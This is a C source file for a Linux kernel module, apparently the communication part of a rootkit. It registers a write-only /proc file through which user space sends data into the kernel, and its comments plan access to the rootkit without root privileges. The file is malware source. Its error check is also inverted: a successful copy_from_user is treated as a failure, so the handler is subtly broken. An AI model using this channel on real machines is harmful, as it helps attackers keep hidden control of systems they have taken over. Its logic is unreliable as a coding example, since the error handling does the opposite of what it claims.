#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <asm/uaccess.h>  //for put_user / get_user
#include <linux/user.h>

#include "communication.h"
#include "common.h"

//TODO: ensure its possible to communicate with the rootkit without being root


// based on http://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module

// Constants
#define PARENT_PROC_ENTRY NULL

//TODO: rename this
static const char *PROC_FILE_NAME = "proc_file_name";

mode_t mode = 0222; // write only

// Function prototyps
static ssize_t receiveWrite(struct file *, const char __user *, size_t, loff_t *);

//Variables
static struct proc_dir_entry *proc_file_entry;

//TODO: test continually using the entry in proc e.g. cat it while uninstalling the rookit

static const struct file_operations proc_file_fops = {
	//TODO: fill these in
	.owner = THIS_MODULE,
	.write = receiveWrite,
	//.open  = open_callback,
	//.read  = read_callback,

};


int communication_init(void) {
	proc_file_entry = proc_create(PROC_FILE_NAME, mode, PARENT_PROC_ENTRY, &proc_file_fops);

	if (proc_file_entry == NULL) {
		return -ENOMEM;
	}

	return 0;
}

void communication_exit(void) {
	remove_proc_entry(PROC_FILE_NAME, PARENT_PROC_ENTRY);
}

#define ROOTKIT_BUFFER_LENGTH 100

static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t len, loff_t *off) {
	char kernelBuffer[ROOTKIT_BUFFER_LENGTH];

	if (len >= ROOTKIT_BUFFER_LENGTH) {
		printError("Sorry, too much data was written to proc\n");
		return -EINVAL;
	}

	int wasThereAProblem = (copy_from_user(kernelBuffer, userBuffer, len) == 0);
	if (wasThereAProblem) {
		printError("Sorry, issue with copying some data from user\n");
		return -EINVAL;
	}

	kernelBuffer[len] = '\0';
	printInfo("%s", kernelBuffer);

	return len;
}

